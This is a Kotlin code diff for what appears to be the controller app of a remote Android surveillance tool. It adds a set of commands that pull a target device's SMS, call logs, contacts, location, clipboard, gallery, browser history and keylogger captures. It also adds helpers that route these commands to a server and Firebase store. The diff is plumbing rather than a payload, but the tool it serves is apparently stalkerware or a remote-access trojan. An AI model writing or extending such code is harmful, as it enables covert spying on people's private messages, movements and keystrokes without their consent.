@@ -198,4 +198,53 @@ object CommandDefinitions {
      * Total number of commands.
      */
     val totalCommands: Int get() = allCommands.size
+
+    /**
+     * Set of command keys that fetch DATA from the device and that we
+     * therefore present a 3-option choice dialog for (عرض الحاليه / جلب
+     * جديد / حفظ محلي). For these commands, tapping the chip first asks
+     * the user whether they want to view data already stored in Firebase
+     * (no round-trip to the device needed), request fresh data from the
+     * device (existing sendCommand flow), or save the current Firebase
+     * snapshot to local app storage for offline viewing.
+     *
+     * This covers all "data" category commands plus the notifications
+     * monitor command (the NotificationsActivity handles its own polling,
+     * but the chip in DeviceDetail still offers the choice).
+     */
+    private val DATA_COMMAND_KEYS: Set<String> = setOf(
+        // Data category
+        "sms", "calls", "contacts", "location", "notifications",
+        "apps", "info", "battery", "gallery", "clipboard",
+        "wifi_info", "network_info", "sim_info", "storage_info",
+        "installed_apps", "running_apps", "calendar",
+        "browser_history", "app_usage",
+        // Keylogger data fetch (monitor category)
+        "get_keylogger",
+        // Files listing — shown via FilesActivity so excluded from choice dialog
+    )
+
+    /**
+     * Returns true if the given command key is a "data fetch" command
+     * that should trigger the 3-option choice dialog (view current /
+     * fetch new / save locally) when tapped in DeviceDetailActivity.
+     */
+    fun isDataCommand(key: String): Boolean {
+        return DATA_COMMAND_KEYS.contains(key)
+    }
+
+    /**
+     * Maps a command key to the data type string the server expects in
+     * the `?type=` query parameter of GET /api/web/data/{device_id}.
+     * Returns null if the command is not a data command.
+     */
+    fun dataTypeForCommand(key: String): String? {
+        if (!DATA_COMMAND_KEYS.contains(key)) return null
+        // info command stores under "device_info" in Firebase
+        return when (key) {
+            "info" -> "device_info"
+            "apps" -> "installed_apps"
+            else -> key
+        }
+    }
 }
